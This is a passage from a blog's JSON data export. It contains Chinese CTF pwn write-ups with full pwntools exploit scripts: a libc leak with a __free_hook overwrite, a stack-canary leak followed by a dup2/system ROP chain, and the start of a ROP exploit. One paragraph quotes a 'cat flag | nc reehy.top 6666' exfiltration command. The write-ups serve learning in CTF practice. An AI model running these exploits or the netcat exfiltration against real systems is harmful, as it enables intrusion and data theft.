getrlimit(<span class=\"number\">2</span>).</div><div class=\"line\"></div><div class=\"line\">ATTRIBUTES</div><div class=\"line\">       <span class=\"keyword\">For</span> an explanation <span class=\"keyword\">of</span> the terms used <span class=\"keyword\">in</span> this section, see attributes(<span class=\"number\">7</span>).</div><div class=\"line\"></div><div class=\"line\">       ┌─────────────────────┬───────────────┬─────────┐</div><div class=\"line\">       │Interface            │ <span class=\"keyword\">Attribute</span>     │ Value   │</div><div class=\"line\">       ├─────────────────────┼───────────────┼─────────┤</div><div class=\"line\">       │malloc(), free(),    │ Thread safety │ MT-Safe │</div><div class=\"line\">       │calloc(), realloc()  │               │         │</div><div class=\"line\">       └─────────────────────┴───────────────┴─────────┘</div><div class=\"line\">...</div><div class=\"line\">...</div><div class=\"line\">...</div></pre></td></tr></table></figure></p>\n<p>思路：</p>\n<ol>\n<li>利用任意地址读泄露libc基址</li>\n<li>将<code>__free_hook</code>修改为<code>one_gadget</code></li>\n</ol>\n<p>exp：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">0</span></div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> local:</div><div class=\"line\">    p = process(<span class=\"string\">'./bigpicture'</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> local <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, open(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">offset = <span class=\"number\">0x109000</span> + <span class=\"number\">16</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(address, data)</span>:</span></div><div class=\"line\">    t = <span class=\"number\">0</span></div><div class=\"line\">    address -= <span class=\"number\">0x398000</span></div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(offset - (address - libc.address), offset - (address - libc.address) - <span class=\"number\">8</span>, <span class=\"number\">-1</span>):</div><div class=\"line\">        k = -i</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">        p.sendline(<span class=\"string\">'0, &#123;&#125;, &#123;&#125;'</span>.format(k, data[t]))</div><div class=\"line\">        t += <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'big?'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1000 x 1000'</span>)</div><div class=\"line\">    leak_realloc = <span class=\"string\">''</span>       <span class=\"comment\"># _dl_runtime_resolve_avx_slow</span></div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0x109000</span> - <span class=\"number\">24</span>, <span class=\"number\">0x109000</span> - <span class=\"number\">30</span>, <span class=\"number\">-1</span>):</div><div class=\"line\">        k = -i</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'&gt;'</span>)</div><div class=\"line\">        p.sendline(<span class=\"string\">'0, &#123;&#125;, r'</span>.format(k))</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'overwriting '</span>)</div><div class=\"line\">        leak_realloc = p.recv(<span class=\"number\">1</span>) + leak_realloc</div><div class=\"line\">    <span class=\"keyword\">print</span> leak_realloc.encode(<span class=\"string\">'hex'</span>)</div><div class=\"line\">    leak_realloc = int(leak_realloc.encode(<span class=\"string\">'hex'</span>), <span class=\"number\">16</span>)</div><div class=\"line\">    libc.address = leak_realloc - libc.plt[<span class=\"string\">'realloc'</span>] - <span class=\"number\">6</span> - <span class=\"number\">0x10</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'libc.address =&gt; '</span>, hex(libc.address)</div><div class=\"line\">    __free_hook_addr = libc.symbols[<span class=\"string\">'__free_hook'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'__free_hook =&gt; '</span>, hex(libc.symbols[<span class=\"string\">'__free_hook'</span>])</div><div class=\"line\">    one_gadget = libc.address + <span class=\"number\">0x3f33a</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'one_gadget =&gt; '</span>, hex(one_gadget)</div><div class=\"line\">    edit(__free_hook_addr, p64(one_gadget))</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    p.sendline(<span class=\"string\">'quit'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n"},{"title":"2017codgate pwn","date":"2017-02-17T10:55:14.000Z","_content":"\n话说一个笔误400分就没了= =，当时怎么就没发现呢，还是编程能力太差Orz\n\n## babypwn\n\n简单题，和2017Ins的babypwn题目一样，除了32位变64位，后来才知道原来32位也可以构成ropchain，和64位一样的传参顺序，难道是如果栈上没有参数就到regs里去找？还是特殊函数传参方法不一样？总之知道`dup2`可以就好了，其他的接着在研究。。\n\n程序没有在字符串后补`\\00`,先覆盖`canary`的`\\00`位泄露`canary`，然后泄露`libcbase`，然后`dup2`+`system`构成`ropchain`。\n\n看了别人的wp，发现还有别的方法，由于程序里调用了`system`，可以先将用`recv`命令`cat flag | nc reehy.top 6666`写到内存中比如`.data`，然后用`system(.data)`即可。\n\nexp\n\n```\nfrom pwn import *\n\nDEBUG = 1\n\n\nelf = ELF('./babypwn')\nsystem = 0x8048620\nsystem = elf.symbols['system']\nsend = elf.symbols['send']\nsystem_got = elf.got['system']\nsend_got = elf.got['send']\nstart_main_got = elf.got['__libc_start_main']\nexit_got = elf.got['exit']\nrecv_got = elf.got['recv']\nmain = 0x08048A71\nret = 0x08048572\nchoose = 0x080488B1\nppr = 0x08048b84\n\nif DEBUG:\n    context.log_level = 'debug'\n    libc = ELF('libc.so.6')\n    p = remote('127.0.0.1', 8181)\nelse:\n    libc = ELF('libc-2.19_16.so')\n    p = remote('110.10.212.130', 8889)\n\ndef canary():\n    p.recvuntil('menu >')\n    p.sendline('1')\n    p.recvuntil('Message :')\n    payload = 'a' * 40\n    p.sendline(payload)\n    p.recvline()\n    a = p.recvline()\n    canary = u32('\\x00' + a[0:3])\n    return canary\n\ndef leak40(addr):\n    p.recvuntil('menu >')\n    p.sendline('1')\n    p.recvuntil('Message :')\n    offset = 'a' * 40 + p32(canary) + 'a' * 8 + p32(0)\n    payload = offset + p32(send) + p32(main)\n    payload += p32(4) + p32(addr) + p32(4) + p32(0)\n    p.sendline(payload)\n    p.recvuntil('menu >')\n    p.sendline('3')\n    p.recv(1)\n    leak = u32(p.recv(4))\n    return leak\n\ndef dofomat():\n    p.recvuntil('menu >')\n    p.sendline('1')\n    p.recvuntil('Message :')\n    offset = 'a' * 40 + p32(canary) + 'a' * 8 + p32(0)\n    payload = offset\n    payload += p32(dup2) + p32(ppr) + p32(4) + p32(0)  # failed!\n    payload += p32(dup2) + p32(ppr) + p32(4) + p32(1)\n    payload += p32(system) + p32(0) +p32(binsh)\n    p.sendline(payload)\n    p.recvuntil('menu >')\n    p.sendline('3')\n\nif __name__ == '__main__':\n    canary = canary()\n    leak = leak40(send_got)\n    dup2 = libc.symbols['dup2'] - libc.symbols['send'] + leak\n    binsh = libc.search('/bin/sh').next() - libc.symbols['send'] + leak\n    dofomat()\n    p.interactive()\n    p.close()\n```","source":"_posts/2017codgate-pwn.md","raw":"---\ntitle: 2017codgate pwn\ntags:\n  - PWN\n  - writeup\ncategories: []\ndate: 2017-02-17 18:55:14\n---\n\n话说一个笔误400分就没了= =，当时怎么就没发现呢，还是编程能力太差Orz\n\n## babypwn\n\n简单题，和2017Ins的babypwn题目一样，除了32位变64位，后来才知道原来32位也可以构成ropchain，和64位一样的传参顺序，难道是如果栈上没有参数就到regs里去找？还是特殊函数传参方法不一样？总之知道`dup2`可以就好了，其他的接着在研究。。\n\n程序没有在字符串后补`\\00`,先覆盖`canary`的`\\00`位泄露`canary`，然后泄露`libcbase`，然后`dup2`+`system`构成`ropchain`。\n\n看了别人的wp，发现还有别的方法，由于程序里调用了`system`，可以先将用`recv`命令`cat flag | nc reehy.top 6666`写到内存中比如`.data`，然后用`system(.data)`即可。\n\nexp\n\n```\nfrom pwn import *\n\nDEBUG = 1\n\n\nelf = ELF('./babypwn')\nsystem = 0x8048620\nsystem = elf.symbols['system']\nsend = elf.symbols['send']\nsystem_got = elf.got['system']\nsend_got = elf.got['send']\nstart_main_got = elf.got['__libc_start_main']\nexit_got = elf.got['exit']\nrecv_got = elf.got['recv']\nmain = 0x08048A71\nret = 0x08048572\nchoose = 0x080488B1\nppr = 0x08048b84\n\nif DEBUG:\n    context.log_level = 'debug'\n    libc = ELF('libc.so.6')\n    p = remote('127.0.0.1', 8181)\nelse:\n    libc = ELF('libc-2.19_16.so')\n    p = remote('110.10.212.130', 8889)\n\ndef canary():\n    p.recvuntil('menu >')\n    p.sendline('1')\n    p.recvuntil('Message :')\n    payload = 'a' * 40\n    p.sendline(payload)\n    p.recvline()\n    a = p.recvline()\n    canary = u32('\\x00' + a[0:3])\n    return canary\n\ndef leak40(addr):\n    p.recvuntil('menu >')\n    p.sendline('1')\n    p.recvuntil('Message :')\n    offset = 'a' * 40 + p32(canary) + 'a' * 8 + p32(0)\n    payload = offset + p32(send) + p32(main)\n    payload += p32(4) + p32(addr) + p32(4) + p32(0)\n    p.sendline(payload)\n    p.recvuntil('menu >')\n    p.sendline('3')\n    p.recv(1)\n    leak = u32(p.recv(4))\n    return leak\n\ndef dofomat():\n    p.recvuntil('menu >')\n    p.sendline('1')\n    p.recvuntil('Message :')\n    offset = 'a' * 40 + p32(canary) + 'a' * 8 + p32(0)\n    payload = offset\n    payload += p32(dup2) + p32(ppr) + p32(4) + p32(0)  # failed!\n    payload += p32(dup2) + p32(ppr) + p32(4) + p32(1)\n    payload += p32(system) + p32(0) +p32(binsh)\n    p.sendline(payload)\n    p.recvuntil('menu >')\n    p.sendline('3')\n\nif __name__ == '__main__':\n    canary = canary()\n    leak = leak40(send_got)\n    dup2 = libc.symbols['dup2'] - libc.symbols['send'] + leak\n    binsh = libc.search('/bin/sh').next() - libc.symbols['send'] + leak\n    dofomat()\n    p.interactive()\n    p.close()\n```","slug":"2017codgate-pwn","published":1,"updated":"2017-02-17T11:15:01.702Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jxn000ihv18i5dgt6of","content":"<p>话说一个笔误400分就没了= =，当时怎么就没发现呢，还是编程能力太差Orz</p>\n<h2 id=\"babypwn\"><a href=\"#babypwn\" class=\"headerlink\" title=\"babypwn\"></a>babypwn</h2><p>简单题，和2017Ins的babypwn题目一样，除了32位变64位，后来才知道原来32位也可以构成ropchain，和64位一样的传参顺序，难道是如果栈上没有参数就到regs里去找？还是特殊函数传参方法不一样？总之知道<code>dup2</code>可以就好了，其他的接着在研究。。</p>\n<p>程序没有在字符串后补<code>\\00</code>,先覆盖<code>canary</code>的<code>\\00</code>位泄露<code>canary</code>，然后泄露<code>libcbase</code>，然后<code>dup2</code>+<code>system</code>构成<code>ropchain</code>。</p>\n<p>看了别人的wp，发现还有别的方法，由于程序里调用了<code>system</code>，可以先将用<code>recv</code>命令<code>cat flag | nc reehy.top 6666</code>写到内存中比如<code>.data</code>，然后用<code>system(.data)</code>即可。</p>\n<p>exp</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">DEBUG = <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./babypwn'</span>)</div><div class=\"line\"><span class=\"keyword\">system</span> = <span class=\"number\">0x8048620</span></div><div class=\"line\"><span class=\"keyword\">system</span> = elf.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\"><span class=\"built_in\">send</span> = elf.symbols[<span class=\"string\">'send'</span>]</div><div class=\"line\">system_got = elf.got[<span class=\"string\">'system'</span>]</div><div class=\"line\">send_got = elf.got[<span class=\"string\">'send'</span>]</div><div class=\"line\">start_main_got = elf.got[<span class=\"string\">'__libc_start_main'</span>]</div><div class=\"line\">exit_got = elf.got[<span class=\"string\">'exit'</span>]</div><div class=\"line\">recv_got = elf.got[<span class=\"string\">'recv'</span>]</div><div class=\"line\">main = <span class=\"number\">0x08048A71</span></div><div class=\"line\">ret = <span class=\"number\">0x08048572</span></div><div class=\"line\">choose = <span class=\"number\">0x080488B1</span></div><div class=\"line\">ppr = <span class=\"number\">0x08048b84</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> DEBUG:</div><div class=\"line\">    context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\">    libc = ELF(<span class=\"string\">'libc.so.6'</span>)</div><div class=\"line\">    p = remote(<span class=\"string\">'127.0.0.1'</span>, <span class=\"number\">8181</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    libc = ELF(<span class=\"string\">'libc-2.19_16.so'</span>)</div><div class=\"line\">    p = remote(<span class=\"string\">'110.10.212.130'</span>, <span class=\"number\">8889</span>)</div><div class=\"line\"></div><div class=\"line\">def canary():</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'menu &gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Message :'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'a'</span> * <span class=\"number\">40</span></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    p.recvline()</div><div class=\"line\">    <span class=\"keyword\">a</span> = p.recvline()</div><div class=\"line\">    canary = u32(<span class=\"string\">'\\x00'</span> + <span class=\"keyword\">a</span>[<span class=\"number\">0</span>:<span class=\"number\">3</span>])</div><div class=\"line\">    <span class=\"literal\">return</span> canary</div><div class=\"line\"></div><div class=\"line\">def leak40(addr):</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'menu &gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Message :'</span>)</div><div class=\"line\">    <span class=\"built_in\">offset</span> = <span class=\"string\">'a'</span> * <span class=\"number\">40</span> + p32(canary) + <span class=\"string\">'a'</span> * <span class=\"number\">8</span> + p32(<span class=\"number\">0</span>)</div><div class=\"line\">    payload = <span class=\"built_in\">offset</span> + p32(<span class=\"built_in\">send</span>) + p32(main)</div><div class=\"line\">    payload += p32(<span class=\"number\">4</span>) + p32(addr) + p32(<span class=\"number\">4</span>) + p32(<span class=\"number\">0</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'menu &gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">    p.recv(<span class=\"number\">1</span>)</div><div class=\"line\">    leak = u32(p.recv(<span class=\"number\">4</span>))</div><div class=\"line\">    <span class=\"literal\">return</span> leak</div><div class=\"line\"></div><div class=\"line\">def dofomat():</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'menu &gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Message :'</span>)</div><div class=\"line\">    <span class=\"built_in\">offset</span> = <span class=\"string\">'a'</span> * <span class=\"number\">40</span> + p32(canary) + <span class=\"string\">'a'</span> * <span class=\"number\">8</span> + p32(<span class=\"number\">0</span>)</div><div class=\"line\">    payload = <span class=\"built_in\">offset</span></div><div class=\"line\">    payload += p32(dup2) + p32(ppr) + p32(<span class=\"number\">4</span>) + p32(<span class=\"number\">0</span>)  <span class=\"comment\"># failed!</span></div><div class=\"line\">    payload += p32(dup2) + p32(ppr) + p32(<span class=\"number\">4</span>) + p32(<span class=\"number\">1</span>)</div><div class=\"line\">    payload += p32(<span class=\"keyword\">system</span>) + p32(<span class=\"number\">0</span>) +p32(binsh)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'menu &gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    canary = canary()</div><div class=\"line\">    leak = leak40(send_got)</div><div class=\"line\">    dup2 = libc.symbols[<span class=\"string\">'dup2'</span>] - libc.symbols[<span class=\"string\">'send'</span>] + leak</div><div class=\"line\">    binsh = libc.search(<span class=\"string\">'/bin/sh'</span>).next() - libc.symbols[<span class=\"string\">'send'</span>] + leak</div><div class=\"line\">    dofomat()</div><div class=\"line\">    p.interactive()</div><div class=\"line\">    p.<span class=\"built_in\">close</span>()</div></pre></td></tr></table></figure>","excerpt":"","more":"<p>话说一个笔误400分就没了= =，当时怎么就没发现呢，还是编程能力太差Orz</p>\n<h2 id=\"babypwn\"><a href=\"#babypwn\" class=\"headerlink\" title=\"babypwn\"></a>babypwn</h2><p>简单题，和2017Ins的babypwn题目一样，除了32位变64位，后来才知道原来32位也可以构成ropchain，和64位一样的传参顺序，难道是如果栈上没有参数就到regs里去找？还是特殊函数传参方法不一样？总之知道<code>dup2</code>可以就好了，其他的接着在研究。。</p>\n<p>程序没有在字符串后补<code>\\00</code>,先覆盖<code>canary</code>的<code>\\00</code>位泄露<code>canary</code>，然后泄露<code>libcbase</code>，然后<code>dup2</code>+<code>system</code>构成<code>ropchain</code>。</p>\n<p>看了别人的wp，发现还有别的方法，由于程序里调用了<code>system</code>，可以先将用<code>recv</code>命令<code>cat flag | nc reehy.top 6666</code>写到内存中比如<code>.data</code>，然后用<code>system(.data)</code>即可。</p>\n<p>exp</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">DEBUG = <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./babypwn'</span>)</div><div class=\"line\"><span class=\"keyword\">system</span> = <span class=\"number\">0x8048620</span></div><div class=\"line\"><span class=\"keyword\">system</span> = elf.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\"><span class=\"built_in\">send</span> = elf.symbols[<span class=\"string\">'send'</span>]</div><div class=\"line\">system_got = elf.got[<span class=\"string\">'system'</span>]</div><div class=\"line\">send_got = elf.got[<span class=\"string\">'send'</span>]</div><div class=\"line\">start_main_got = elf.got[<span class=\"string\">'__libc_start_main'</span>]</div><div class=\"line\">exit_got = elf.got[<span class=\"string\">'exit'</span>]</div><div class=\"line\">recv_got = elf.got[<span class=\"string\">'recv'</span>]</div><div class=\"line\">main = <span class=\"number\">0x08048A71</span></div><div class=\"line\">ret = <span class=\"number\">0x08048572</span></div><div class=\"line\">choose = <span class=\"number\">0x080488B1</span></div><div class=\"line\">ppr = <span class=\"number\">0x08048b84</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> DEBUG:</div><div class=\"line\">    context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\">    libc = ELF(<span class=\"string\">'libc.so.6'</span>)</div><div class=\"line\">    p = remote(<span class=\"string\">'127.0.0.1'</span>, <span class=\"number\">8181</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    libc = ELF(<span class=\"string\">'libc-2.19_16.so'</span>)</div><div class=\"line\">    p = remote(<span class=\"string\">'110.10.212.130'</span>, <span class=\"number\">8889</span>)</div><div class=\"line\"></div><div class=\"line\">def canary():</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'menu &gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Message :'</span>)</div><div class=\"line\">    payload = <span class=\"string\">'a'</span> * <span class=\"number\">40</span></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    p.recvline()</div><div class=\"line\">    <span class=\"keyword\">a</span> = p.recvline()</div><div class=\"line\">    canary = u32(<span class=\"string\">'\\x00'</span> + <span class=\"keyword\">a</span>[<span class=\"number\">0</span>:<span class=\"number\">3</span>])</div><div class=\"line\">    <span class=\"literal\">return</span> canary</div><div class=\"line\"></div><div class=\"line\">def leak40(addr):</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'menu &gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Message :'</span>)</div><div class=\"line\">    <span class=\"built_in\">offset</span> = <span class=\"string\">'a'</span> * <span class=\"number\">40</span> + p32(canary) + <span class=\"string\">'a'</span> * <span class=\"number\">8</span> + p32(<span class=\"number\">0</span>)</div><div class=\"line\">    payload = <span class=\"built_in\">offset</span> + p32(<span class=\"built_in\">send</span>) + p32(main)</div><div class=\"line\">    payload += p32(<span class=\"number\">4</span>) + p32(addr) + p32(<span class=\"number\">4</span>) + p32(<span class=\"number\">0</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'menu &gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">    p.recv(<span class=\"number\">1</span>)</div><div class=\"line\">    leak = u32(p.recv(<span class=\"number\">4</span>))</div><div class=\"line\">    <span class=\"literal\">return</span> leak</div><div class=\"line\"></div><div class=\"line\">def dofomat():</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'menu &gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Message :'</span>)</div><div class=\"line\">    <span class=\"built_in\">offset</span> = <span class=\"string\">'a'</span> * <span class=\"number\">40</span> + p32(canary) + <span class=\"string\">'a'</span> * <span class=\"number\">8</span> + p32(<span class=\"number\">0</span>)</div><div class=\"line\">    payload = <span class=\"built_in\">offset</span></div><div class=\"line\">    payload += p32(dup2) + p32(ppr) + p32(<span class=\"number\">4</span>) + p32(<span class=\"number\">0</span>)  <span class=\"comment\"># failed!</span></div><div class=\"line\">    payload += p32(dup2) + p32(ppr) + p32(<span class=\"number\">4</span>) + p32(<span class=\"number\">1</span>)</div><div class=\"line\">    payload += p32(<span class=\"keyword\">system</span>) + p32(<span class=\"number\">0</span>) +p32(binsh)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'menu &gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    canary = canary()</div><div class=\"line\">    leak = leak40(send_got)</div><div class=\"line\">    dup2 = libc.symbols[<span class=\"string\">'dup2'</span>] - libc.symbols[<span class=\"string\">'send'</span>] + leak</div><div class=\"line\">    binsh = libc.search(<span class=\"string\">'/bin/sh'</span>).next() - libc.symbols[<span class=\"string\">'send'</span>] + leak</div><div class=\"line\">    dofomat()</div><div class=\"line\">    p.interactive()</div><div class=\"line\">    p.<span class=\"built_in\">close</span>()</div></pre></td></tr></table></figure>"},{"title":"2017广东红帽pwn","date":"2017-05-09T14:13:59.000Z","_content":"\n第一次ak，记录下。不过主要因为题目很简单。\n<!--more-->\n\n## pwn1\n\n栈溢出，`system`已经有了，用rop在.rodata段上写/bin/sh，然后调用system即可。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 0\nlocal = 0\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./pwn1')\nelse:\n    p = remote('106.75.93.221',10000)\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = 